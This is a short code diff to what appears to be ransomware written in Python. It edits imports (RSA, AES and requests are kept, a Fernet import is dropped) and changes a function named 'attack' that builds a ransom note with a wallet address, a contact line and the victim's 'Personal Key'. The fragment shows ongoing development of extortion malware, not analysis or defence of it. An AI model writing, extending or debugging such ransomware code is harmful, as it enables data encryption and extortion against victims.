@@ -3,7 +3,6 @@ import random
 import base64
 import requests as req
 from time import sleep
-from cryptography.fernet import Fernet as xf
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -79,7 +78,7 @@ def attack(target):
 
                 Choice one payment\n'''+ WALLET_ADDRESS + '''
                 
-                Your Personal Key is : ''' + lcx.split('.')[0] + '''
+                Your Personal Key is : ''' + lcx + '''
 
                 ''' + CONTACT + '''
                 Thank You For Your Attention (*v*)'''
